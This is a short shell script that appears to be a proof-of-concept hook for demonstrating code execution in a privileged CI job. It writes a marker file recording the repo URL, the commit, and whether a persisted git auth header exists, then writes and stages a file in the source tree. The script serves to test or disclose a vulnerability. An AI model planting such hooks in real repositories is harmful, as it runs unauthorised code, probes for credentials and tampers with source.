#!/bin/sh
set -eu
marker="${RUNNER_TEMP:-..}/fsharp-rce-marker.txt"
{
  echo "PRIVILEGED_HOOK_EXECUTED"
  echo "repository=$(git config --get remote.origin.url || true)"
  echo "head=$(git rev-parse HEAD)"
  if git config --get-regexp '^http\..*\.extraheader$' >/dev/null 2>&1; then
    echo "persisted_git_auth_header_present=true"
  else
    echo "persisted_git_auth_header_present=false"
  fi
} > "$marker"
printf 'ATTACKER_HOOK_WROTE_THIS\n' > src/fsharp-rce-gate/hook-write.txt
git add src/fsharp-rce-gate/hook-write.txt
